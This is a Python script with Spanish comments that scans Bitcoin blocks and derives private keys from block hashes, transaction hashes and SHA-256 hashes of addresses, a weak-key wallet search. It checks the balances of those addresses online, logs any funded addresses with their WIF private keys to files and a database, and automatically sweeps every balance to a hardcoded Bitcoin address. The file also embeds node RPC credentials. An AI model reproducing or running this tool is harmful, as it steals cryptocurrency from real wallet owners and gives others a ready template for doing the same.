import os
import hashlib
import requests
import json
import sqlite3
from requests.auth import HTTPBasicAuth

import time
from bitcoinx import (
    private_key_to_public_key,
    pubkey_to_bitcoin_address,
    btcPrivatekeyHextoWIF,
)

from getz_input import (
    parseTx,
    getSignableTxn
)

from bit import Key
from bit.network import NetworkAPI

# RPC BTC
btcHost = '127.0.0.1'
auth = HTTPBasicAuth('anigametv', 'gotech2020')

# SQLITE Base de datos local
# Función para guardar datos
def guardar_datos(address, wif):
    # Conectar a la base de datos local (se creará si no existe)
    conn = sqlite3.connect('vulnerableWalletBTC.db')
    cursor = conn.cursor()
    
    # Crear la tabla si no existe
    cursor.execute('''
    CREATE TABLE IF NOT EXISTS datos (
        address TEXT PRIMARY KEY,
        wif TEXT NOT NULL
    )
    ''')
    
    # Insertar datos en la tabla
    cursor.execute('''
    INSERT INTO datos (address, wif) VALUES (?, ?)
    ''', (address, wif))
    
    # Guardar los cambios y cerrar la conexión
    conn.commit()
    conn.close()


# Función para obtener todas las addresses
def obtener_todas_las_addresses():
    # Conectar a la base de datos local
    conn = sqlite3.connect('datos.db')
    cursor = conn.cursor()
    
    # Obtener todas las addresses de la tabla
    cursor.execute('''
    SELECT address FROM datos
    ''')
    resultados = cursor.fetchall()
    
    # Cerrar la conexión
    conn.close()
    
    # Convertir el resultado en un array de addresses
    addresses = [resultado[0] for resultado in resultados]
    return addresses


# Función para buscar el wif por address
def buscar_wif_por_address(address):
    # Conectar a la base de datos local
    conn = sqlite3.connect('vulnerableWalletBTC.db')
    cursor = conn.cursor()
    
    # Buscar el wif correspondiente al address
    cursor.execute('''
    SELECT wif FROM datos WHERE address = ?
    ''', (address,))
    resultado = cursor.fetchone()
    
    # Cerrar la conexión
    conn.close()
    
    # Retornar el wif si se encuentra, de lo contrario, retornar None
    return resultado[0] if resultado else None



def guardar_texto_en_archivo(texto, nombre_archivo):
    with open(nombre_archivo, 'a') as archivo:
        archivo.write(texto + '\n')


# Obtener Numero del Bloque
def get_latest_block_number():
    data = {
        "method": "getblockcount",
        "params": [],
        "id": 1
    }

    try:
        response = requests.post(f'http://{btcHost}:8332/', json=data, auth=auth, headers={'Content-Type': 'application/json'})
        response.raise_for_status()  # Raises an error for 4xx/5xx status codes
        result = response.json().get('result')
        return result
    except requests.exceptions.RequestException as e:
        return False


# Obtener Informacion del Bloque por el hash pasando el numero
def obtener_info_bloque(block_number):
    
    # Obtener el hash del bloque usando el número del bloque
    data = {
        "method": "getblockhash",
        "params": [block_number],
        "id": 1
    }

    try:
        response = requests.post(f'http://{btcHost}:8332/', json=data, auth=auth, headers={'Content-Type': 'application/json'})
        response.raise_for_status()
        block_hash = response.json().get('result')
        
        # Obtener la información del bloque usando el hash del bloque
        data = {
            "method": "getblock",
            "params": [block_hash],
            "id": 1
        }
        response = requests.post(f'http://{btcHost}:8332/', json=data, auth=auth, headers={'Content-Type': 'application/json'})
        response.raise_for_status()
        block_info = response.json().get('result')

        # Extraer hash del bloque y array de transacciones
        block_hash = block_info.get('hash')
        tx_array = block_info.get('tx')
        
        return block_hash, tx_array

    except requests.exceptions.RequestException as e:
        return None, []


# Obtener todas las direcciones del tx
def get_transaction_addresses(txid=None):

    if not txid:
        return []


    data = {
        "method": "getrawtransaction",
        "params": [txid, True],
        "id": 1
    }

    try:
        response = requests.post(f'http://{btcHost}:8332/', json=data, auth=auth, headers={'Content-Type': 'application/json'})
        response.raise_for_status()
        transaction_info = response.json().get('result')

        getRAWTX = transaction_info['hex']

        if not getRAWTX:
            return []
        
        m = parseTx(getRAWTX)

        if isinstance(m, dict) and "error" in m:
            return []

        e = getSignableTxn(m)

        # Extraer direcciones de salida 
        addresses = set()

        for i in range(len(e)):
            pubKey = e[i][3]
            # Convertir PubKey a Address
            getAddress = pubkey_to_bitcoin_address(pubKey)
            addresses.add(getAddress)


        return addresses

    except requests.exceptions.RequestException as e:
        print(f"Ocurrio Error al obtener address: {e}")
        return []


# Función para enviar todos los fondos
def send_all_funds(privateKeyWIF, destination_address):
    # Crear una clave a partir de la clave privada en formato WIF
    key = Key(privateKeyWIF)

    while True:

        # Verificar el saldo disponible
        balance = key.get_balance('btc')
        print(f"Saldo disponible: {balance} BTC")
        
        try:
            # Asegurarse de que balance es un número flotante
            balance = float(balance)
        except ValueError:
            print("Error: El saldo no es un número válido.")
            return


        if balance <= 0:
            print("No hay fondos disponibles para enviar")
            break  # Sale del bucle while si se cumple la condición


        try:
            # Crear la transacción con la tarifa configurada
            tx = key.create_transaction([], leftover=destination_address, replace_by_fee=False, absolute_fee=True)

            # Verificar que la transacción fue exitosa
            if tx:
                print(f"Transacción creada con éxito: {tx}")
            else:
                print("No se pudo crear la transacción, sin detalles de la respuesta.")

        except Exception as e:
            print(f"Error al crear la transacción: {str(e)}")


        # Esperar 10 segundos antes de intentar nuevamente hasta que quede en 0 BTC
        time.sleep(10)



# Función para obtener el balance de una dirección usando la API de Blockchain.info
def obtener_balance_direccion(direcciones):
    """
    Obtiene el balance de varias direcciones usando la API de Blockchain.info.
    Las direcciones se pasan en lotes de 140 debido a las limitaciones de la API.

    :param direcciones: Lista de direcciones Bitcoin.
    :return: Diccionario con los balances de las direcciones.
    """
    # Asegúrate de que 'direcciones' es una lista
    if isinstance(direcciones, str):
        direcciones = direcciones.split(',')  # Convertir cadena separada por comas en lista


    # Agrupar direcciones en bloques de 140 para evitar superar los límites de la API
    balances = {}
    for i in range(0, len(direcciones), 140):
        batch = direcciones[i:i+140]

        # Unir las direcciones con '|' para la URL
        direcciones_unidas = '|'.join(batch)
        
        url = f"https://blockchain.info/balance?active={direcciones_unidas}"
        response = requests.get(url)
        
        if response.status_code == 200:
            data = response.json()

            balances.update(data)
        else:
            print(f"Error al obtener el balance para las direcciones: {direcciones_unidas}")
            print(f"Respuesta de la API: {response.text}")
        

        # Esperar 5 segundos antes de procesar el siguiente lote
        time.sleep(5)
    
    return balances



# Función para generar direcciones y WIF
def generar_direcciones_y_wif(texto=None, isAddress=False):
    """
    Genera las direcciones Bitcoin (comprimida y sin comprimir) y sus WIFs a partir de un texto.

    :param texto: Cadena de texto base para generar el hash SHA-256.
    :param isAddress: Si es True, se genera una dirección; si es False, se genera una clave privada.
    :return: Diccionario con las direcciones y WIFs.
    """

    if texto is None:
        return False  # Si texto es None, devolvemos False

    if isAddress:
        # Generar el hash SHA-256 del texto
        hex_generate = hashlib.sha256(texto.encode()).hexdigest()
    else:
        # Usar el texto tal cual si isAddress es False
        hex_generate = texto


    # Convertir Hex a WIF (comprimida y sin comprimir)
    pk_wif_sin_comprimir, pk_wif_comprimida = btcPrivatekeyHextoWIF(hex_generate)
    
    # PrivateKey HEX to Pubkey (comprimida y sin comprimir)
    pubkey_sin_comprimir, pubkey_comprimida = private_key_to_public_key(hex_generate)
    
    # PubKey to Address (comprimida y sin comprimir)
    address_sin_comprimir = pubkey_to_bitcoin_address(pubkey_sin_comprimir)
    address_comprimida = pubkey_to_bitcoin_address(pubkey_comprimida)
    
    # Devolver los resultados en un diccionario
    return {
        "hash_hex": hex_generate,
        "wif_sin_comprimir": pk_wif_sin_comprimir,
        "wif_comprimida": pk_wif_comprimida,
        "direccion_sin_comprimir": address_sin_comprimir,
        "direccion_comprimida": address_comprimida,
    }



# Función para procesar un bloque y sus transacciones
def procesar_bloque_y_transacciones(bloque_id):
    """
    Procesa un bloque, extrae las direcciones de las transacciones y obtiene sus balances.

    :param bloque_id: ID del bloque (número de bloque).
    :return: None
    """
    # Obtener información del bloque
    block_hash, tx_hashes = obtener_info_bloque(bloque_id)
    if block_hash is None:
        return

    # Inicializamos un diccionario para almacenar las direcciones y sus WIFs
    direcciones_wif = {}

    # Convertir el hash del bloque en direcciones y agregar los WIFs al diccionario
    resultadoBlockhashToAddress = generar_direcciones_y_wif(block_hash, isAddress=False)

    # Verificar si la respuesta no es False antes de agregar las direcciones
    if resultadoBlockhashToAddress:
        # Asignamos solo el WIF correspondiente para cada dirección
        direcciones_wif[resultadoBlockhashToAddress['direccion_sin_comprimir']] = resultadoBlockhashToAddress['wif_sin_comprimir']
        direcciones_wif[resultadoBlockhashToAddress['direccion_comprimida']] = resultadoBlockhashToAddress['wif_comprimida']


    # Convertimos los hashes de las transacciones en direcciones y asignamos los WIFs
    for tx_hash in tx_hashes:
        resultadoTxToAddress = generar_direcciones_y_wif(tx_hash, isAddress=False)

        # Verificar si la respuesta no es False antes de agregar las direcciones
        if resultadoTxToAddress:
            # Asignamos solo el WIF correspondiente para cada dirección
            direcciones_wif[resultadoTxToAddress['direccion_sin_comprimir']] = resultadoTxToAddress['wif_sin_comprimir']
            direcciones_wif[resultadoTxToAddress['direccion_comprimida']] = resultadoTxToAddress['wif_comprimida']



    # Obtenemos las direcciones de las transacciones y les asignamos los WIFs
    for i, tx_hash in enumerate(tx_hashes):
        # Mostrar el número de transacciones restantes por procesar
        print(f"Procesando transacción {tx_hash}... ({i+1} de {len(tx_hashes)}) restantes.")

        tx_direcciones = get_transaction_addresses(tx_hash)
        for addr in tx_direcciones:
            # Convertir la dirección y asignar solo el WIF correspondiente
            resultado = generar_direcciones_y_wif(addr, isAddress=True)

            if resultado:  # Verificamos que resultado no sea False
                # Asignamos solo el WIF correspondiente para cada dirección
                direcciones_wif[resultado['direccion_sin_comprimir']] = resultado['wif_sin_comprimir']
                direcciones_wif[resultado['direccion_comprimida']] = resultado['wif_comprimida']


        # Esperar 1 segundo antes del proximo tx_hash para obtener direcciones
        #time.sleep(1)



    # Obtener balances de las direcciones (en grupos de 100)
    while len(direcciones_wif) > 0:

        # Convertir las direcciones a una cadena separada por comas
        direcciones_batch = ','.join(list(direcciones_wif.keys()))  # Direcciones separadas por coma

        # Llamar a la función para obtener el balance, pasando las direcciones como una cadena separada por coma
        balances = obtener_balance_direccion(direcciones_batch)

        # Imprimir las direcciones con balance
        for direccion, balance_data in balances.items():
            balance = balance_data.get('final_balance', 0)
            totalBalance = balance_data.get('total_received', 0)

            #print(f"address: {direccion} :: {balance} BTC :: Total Balance: {totalBalance}")
            if balance > 0 or totalBalance > 0:
                # Obtenemos el WIF correspondiente para la dirección
                wif = direcciones_wif.get(direccion)
                
                if wif:
                    print(f"[WIN!] Dirección: {direccion}, Balance: {balance} BTC, WIF: {wif} :: Total Balance: {totalBalance}")

                    guardar_texto_en_archivo(f"Dirección: {direccion}, Balance: {balance} BTC, WIF: {wif} :: Total Balance: {totalBalance}", "walletconBalance.txt")

                    # Crear Archivo para Subir a Electrum y asi monitorear mejor
                    guardar_texto_en_archivo(f"${wif}", "WalletsVulnerablesWIFElectrum.txt")

                    # Crear Archivo Para Vigilancia mas adelante
                    guardar_texto_en_archivo(f"{direccion}|{wif}", "VulnerableVigilancia.txt")

                    # Guardar en base de datos local
                    guardar_datos(direccion, wif)

                    
                    if balance > 0:
                        # Enviar todo el balance
                        send_all_funds(wif, 'bc1qmp3tj4gyjndqqlt20nu53ed9z7haa6z6wlckdc')


        # Eliminar las direcciones procesadas
        direcciones_wif = {k: v for k, v in direcciones_wif.items() if k not in direcciones_batch}



# Obtener el número del último bloque
latest_block_number = None

def contador_infinito(inicio, archivo="avanceBlock.txt"):
    # Verifica si el archivo existe
    if os.path.exists(archivo):
        # Lee el último número guardado en el archivo
        with open(archivo, 'r') as f:
            contenido = f.read().strip()
            if contenido:
                inicio = int(contenido)  # Continua desde el último número guardado
    
    i = inicio
    while True:
        yield i
        i += 1
        # Guarda el número actual en el archivo
        with open(archivo, 'w') as f:
            f.write(str(i))



# nos quedamos en 494068
# comenzaremos desde el bloque actual
getLastBloque = get_latest_block_number()

# 2024 enero 2
for i in contador_infinito(824000):

    new_block_number = i
    print(f"[BlockId: {new_block_number}]")
    if new_block_number != latest_block_number:
        latest_block_number = new_block_number
        procesar_bloque_y_transacciones(latest_block_number)
